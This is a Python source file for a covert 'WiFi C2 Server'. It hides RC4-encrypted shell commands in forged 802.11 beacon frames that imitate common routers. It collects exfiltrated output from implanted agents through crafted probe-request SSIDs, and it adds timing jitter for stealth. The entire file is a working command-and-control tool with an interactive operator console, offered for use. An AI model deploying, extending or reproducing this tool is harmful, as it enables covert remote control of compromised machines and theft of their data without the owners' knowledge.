#!/usr/bin/env python3
import sys, time, struct, random, base64, os, threading, argparse
from scapy.all import *

# --- CONFIGURATION ---
INTERFACE = "wlan0mon"          
C2_OUI = b'\x00\x40\x96'        
EXFIL_OUI = b'\x00\x40\x97'     
TAGS_PER_BEACON = 5             

RC4_KEY = bytes([0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 
                 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01])

# --- JITTER CONFIGURATION ---
BEACON_JITTER_MIN = 0.08   # Min delay between beacons (seconds)
BEACON_JITTER_MAX = 0.12   # Max delay (~100ms is typical for real APs)
CYCLE_JITTER_MIN = 0.05    # Min delay between broadcast cycles
CYCLE_JITTER_MAX = 0.15    # Max delay between broadcast cycles

# --- SESSION IDENTITY (generated once at startup) ---
def generate_session_identity():
    """Generate a stable identity for this session - looks like one real AP"""
    # Common vendor prefixes
    vendor_prefixes = [
        ([0x00, 0x1A, 0x2B], "Cisco"),
        ([0x00, 0x1E, 0x58], "D-Link"),
        ([0x00, 0x24, 0xB2], "Netgear"),
        ([0x00, 0x26, 0x5A], "TP-Link"),
        ([0x00, 0x1C, 0x10], "Linksys"),
    ]
    # Common SSIDs that blend in
    ssid_options = ["xfinitywifi", "linksys", "NETGEAR", "ATT-WIFI-5G", "HOME-WIFI"]
    
    prefix, vendor = random.choice(vendor_prefixes)
    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
    mac = prefix + suffix
    bssid = ':'.join(f'{b:02x}' for b in mac)
    ssid = random.choice(ssid_options)
    
    return bssid, ssid, vendor

# Generate once at module load
SESSION_BSSID, SESSION_SSID, SESSION_VENDOR = generate_session_identity()

# --- STATE ---
current_job = None
broadcast_active = False
response_buffers = {}
completed_responses = set() 
listen_mode = False
known_agents = set()

# --- UTILITY ---
def jitter(min_val, max_val):
    """Return random delay for jitter"""
    return random.uniform(min_val, max_val)

# --- CRYPTO ---
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

def create_beacon(chunks_batch):
    """Create beacon with stable session identity"""
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', 
                  addr2=SESSION_BSSID, addr3=SESSION_BSSID)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=SESSION_SSID, len=len(SESSION_SSID))
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    dsset = Dot11Elt(ID='DSset', info=b'\x06') 
    packet = RadioTap()/dot11/beacon/essid/rates/dsset
    for chunk in chunks_batch:
        packet = packet / Dot11Elt(ID=221, info=chunk)
    return packet

def prepare_job(command, agent_id=0):
    """
    Prepare job with agent targeting
    agent_id: 0 = broadcast to all, 1-255 = specific agent
    """
    data = command.encode('utf-8')
    encrypted = rc4(RC4_KEY, data)
    payload = base64.b64encode(encrypted)
    chunk_size = 239
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    job_id = struct.pack('>H', random.randint(1, 65535))
    total = len(chunks)
    prepared = []
    for seq, chunk_data in enumerate(chunks, 1):
        header = C2_OUI + bytes([agent_id]) + job_id + struct.pack('>H', seq) + struct.pack('>H', total)
        prepared.append(header + chunk_data)
    return job_id, prepared, agent_id

# --- THREADS ---
def broadcast_loop():
    global current_job, broadcast_active
    while True:
        if broadcast_active and current_job:
            job_id, chunks, agent_id = current_job
            for i in range(0, len(chunks), TAGS_PER_BEACON):
                if not broadcast_active: break
                try:
                    batch = chunks[i:i+TAGS_PER_BEACON]
                    sendp(create_beacon(batch), iface=INTERFACE, verbose=0)
                    # Jittered delay between beacons
                    time.sleep(jitter(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
                except OSError as e:
                    broadcast_active = False
                    break
            # Jittered delay between broadcast cycles
            time.sleep(jitter(CYCLE_JITTER_MIN, CYCLE_JITTER_MAX))
        else:
            time.sleep(0.1)

def handle_probe(pkt):
    global response_buffers, completed_responses, known_agents
    
    if not pkt.haslayer(Dot11ProbeReq) or not pkt.haslayer(Dot11Elt):
        return
    
    try:
        ssid = pkt[Dot11Elt].info
        if not ssid or len(ssid) < 10 or ssid[:3] != EXFIL_OUI:
            return
        
        agent_id = ssid[3]
        job_id = (ssid[4] << 8) | ssid[5]
        response_key = (agent_id, job_id)
        
        if response_key in completed_responses:
            return 
        
        if agent_id not in known_agents and agent_id != 0:
            known_agents.add(agent_id)
        
        seq = (ssid[6] << 8) | ssid[7]
        total = (ssid[8] << 8) | ssid[9]
        data = ssid[10:].decode('latin-1') 
        
        if response_key not in response_buffers:
            print(f"\n\033[93m[<] Agent {agent_id} responding (Job 0x{job_id:04x}, {total} chunks)...\033[0m")
            print("\033[94mC2>\033[0m ", end='', flush=True)
            response_buffers[response_key] = {
                'total': total, 
                'parts': {}, 
                'start_time': time.time()
            }
        
        buf = response_buffers[response_key]
        
        if seq not in buf['parts']:
            buf['parts'][seq] = data
            
            if len(buf['parts']) == total:
                completed_responses.add(response_key)
                elapsed = time.time() - buf['start_time']
                
                full_b64 = ''.join(buf['parts'][i] for i in range(1, total + 1))
                
                try:
                    encrypted = base64.b64decode(full_b64)
                    decrypted = rc4(RC4_KEY, encrypted)
                    
                    print(f"\n\033[92m{'='*60}")
                    print(f"[+] Agent {agent_id} | Job 0x{job_id:04x} | {elapsed:.1f}s")
                    print(f"{'='*60}\033[0m")
                    print(decrypted.decode('utf-8', errors='replace'))
                    print(f"\033[92m{'='*60}\033[0m")
                    
                except Exception as e:
                    print(f"\n[-] Decryption error: {e}")
                
                del response_buffers[response_key]
                print("\n\033[94mC2>\033[0m ", end='', flush=True)

    except Exception:
        pass

def sniffer_loop():
    sniff(iface=INTERFACE, prn=handle_probe, 
          lfilter=lambda p: p.haslayer(Dot11ProbeReq), store=0)

def print_help():
    print("""
\033[93m╔══════════════════════════════════════════════════════════╗
║              WiFi C2 Server (Multi-Agent)                ║
╠══════════════════════════════════════════════════════════╣
║  send <agent> <cmd>  - Send command to specific agent    ║
║                        agent=0 broadcasts to ALL agents  ║
║  stop                - Stop broadcasting                 ║
║  status              - Show state                        ║
║  agents              - List known agents                 ║
║  responses           - Show pending responses            ║
║  jitter [min] [max]  - Set beacon jitter (milliseconds)  ║
║  clear               - Clear pending responses           ║
║  exit                - Quit                              ║
╠══════════════════════════════════════════════════════════╣
║  Examples:                                               ║
║    send 1 whoami     - Send 'whoami' to Agent 1          ║
║    send 0 hostname   - Broadcast 'hostname' to all       ║
║    jitter 100 500    - Set jitter between 100-500ms      ║
╚══════════════════════════════════════════════════════════╝\033[0m
""")

def interactive():
    global current_job, broadcast_active, listen_mode, response_buffers, known_agents
    global BEACON_JITTER_MIN, BEACON_JITTER_MAX, CYCLE_JITTER_MIN, CYCLE_JITTER_MAX
    
    threading.Thread(target=broadcast_loop, daemon=True).start()
    
    if listen_mode:
        threading.Thread(target=sniffer_loop, daemon=True).start()
        print("\033[92m[+] Response listener ENABLED\033[0m")
    
    print(f"[*] Interface: {INTERFACE}")
    print(f"[*] Identity: {SESSION_SSID} ({SESSION_VENDOR}) @ {SESSION_BSSID}")
    print(f"[*] Jitter: {BEACON_JITTER_MIN*1000:.0f}-{BEACON_JITTER_MAX*1000:.0f}ms")
    print_help()
    
    while True:
        try:
            cmd = input("\n\033[94mC2>\033[0m ").strip()
            if not cmd: continue
            
            parts = cmd.split(" ", 2)
            action = parts[0].lower()
            
            if action == "send":
                if len(parts) < 3:
                    print("\033[91m[-] Usage: send <agent_id> <command>\033[0m")
                    print("    agent_id=0 for broadcast, 1-255 for specific agent")
                    continue
                
                try:
                    agent_id = int(parts[1])
                    if agent_id < 0 or agent_id > 255:
                        print("\033[91m[-] Agent ID must be 0-255\033[0m")
                        continue
                except ValueError:
                    print("\033[91m[-] Agent ID must be a number (0-255)\033[0m")
                    continue
                
                command = parts[2]
                job_id, chunks, target = prepare_job(command, agent_id)
                current_job = (job_id, chunks, agent_id)
                broadcast_active = True
                
                if agent_id == 0:
                    print(f"\033[92m[+] Broadcasting Job 0x{job_id.hex()} to ALL agents ({len(chunks)} chunks)\033[0m")
                else:
                    print(f"\033[92m[+] Sending Job 0x{job_id.hex()} to Agent {agent_id} ({len(chunks)} chunks)\033[0m")
                
            elif action == "stop":
                broadcast_active = False
                print("[*] Broadcast stopped")
            
            elif action == "status":
                print(f"[*] Broadcasting: {broadcast_active}")
                print(f"[*] Identity: {SESSION_SSID} @ {SESSION_BSSID}")
                if current_job:
                    job_id, chunks, agent_id = current_job
                    target = "ALL" if agent_id == 0 else f"Agent {agent_id}"
                    print(f"[*] Current Job: 0x{job_id.hex()} -> {target}")
                print(f"[*] Known Agents: {sorted(known_agents) if known_agents else 'None discovered yet'}")
                print(f"[*] Pending Responses: {len(response_buffers)}")
                print(f"[*] Jitter: {BEACON_JITTER_MIN*1000:.0f}-{BEACON_JITTER_MAX*1000:.0f}ms")
            
            elif action == "agents":
                if known_agents:
                    print("\033[96m[*] Known Agents:\033[0m")
                    for aid in sorted(known_agents):
                        print(f"    - Agent {aid}")
                else:
                    print("[*] No agents discovered yet")
                    print("    Agents are discovered when they respond to commands")
            
            elif action == "jitter":
                jitter_parts = cmd.split()
                if len(jitter_parts) == 1:
                    print(f"[*] Current jitter: {BEACON_JITTER_MIN*1000:.0f}-{BEACON_JITTER_MAX*1000:.0f}ms (beacon)")
                    print(f"[*] Usage: jitter <min_ms> <max_ms>")
                elif len(jitter_parts) >= 3:
                    try:
                        new_min = float(jitter_parts[1]) / 1000.0
                        new_max = float(jitter_parts[2]) / 1000.0
                        if new_min > new_max:
                            new_min, new_max = new_max, new_min
                        BEACON_JITTER_MIN = new_min
                        BEACON_JITTER_MAX = new_max
                        CYCLE_JITTER_MIN = new_min * 1.5
                        CYCLE_JITTER_MAX = new_max * 1.5
                        print(f"\033[92m[+] Jitter set to {BEACON_JITTER_MIN*1000:.0f}-{BEACON_JITTER_MAX*1000:.0f}ms\033[0m")
                    except ValueError:
                        print("\033[91m[-] Invalid values. Usage: jitter <min_ms> <max_ms>\033[0m")
                else:
                    print("\033[91m[-] Usage: jitter <min_ms> <max_ms>\033[0m")
                
            elif action == "responses":
                if response_buffers:
                    print("\033[96m[*] Pending responses:\033[0m")
                    for (aid, jid), buf in response_buffers.items():
                        received = len(buf['parts'])
                        total = buf['total']
                        pct = int((received / total) * 20)
                        bar = '█' * pct + '░' * (20 - pct)
                        elapsed = time.time() - buf['start_time']
                        print(f"    Agent {aid} | Job 0x{jid:04x} | [{bar}] {received}/{total} | {elapsed:.1f}s")
                else:
                    print("[*] No pending responses")
                    
            elif action == "clear":
                response_buffers.clear()
                completed_responses.clear()
                print("[*] Cleared buffers & history")
                
            elif action in ("exit", "quit"):
                break
            
            elif action == "help":
                print_help()
                
            else:
                print(f"\033[91m[-] Unknown command: {action}\033[0m")
                print("    Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WiFi C2 Server (Multi-Agent)')
    parser.add_argument('-listen', action='store_true', help='Enable response listener')
    parser.add_argument('-i', '--interface', default='wlan0mon', help='WiFi interface')
    parser.add_argument('-jitter', type=int, nargs=2, metavar=('MIN', 'MAX'), 
                        help='Beacon jitter in ms (default: 30-150)')
    args = parser.parse_args()
    
    INTERFACE = args.interface
    listen_mode = args.listen
    
    if args.jitter:
        BEACON_JITTER_MIN = args.jitter[0] / 1000.0
        BEACON_JITTER_MAX = args.jitter[1] / 1000.0
        CYCLE_JITTER_MIN = BEACON_JITTER_MIN * 1.5
        CYCLE_JITTER_MAX = BEACON_JITTER_MAX * 1.5
    
    # Setup channel (Channel 6)
    os.system(f"iwconfig {INTERFACE} channel 6")
    
    print("""
\033[96m
 __        _____ _____ ___    _    ___ ____  
 \\ \\      / /_ _|  ___|_ _|  / \\  |_ _|  _ \\ 
  \\ \\ /\\ / / | || |_   | |  / _ \\  | || |_) |
   \\ V  V /  | ||  _|  | | / ___ \\ | ||  _ < 
    \\_/\\_/  |___|_|   |___/_/   \\_\\___|_| \\_\\
\033[0m
    """)
    print("\033[93m[*] WiFi C2 Server v2.0 (Stealth Mode)\033[0m")
    
    interactive()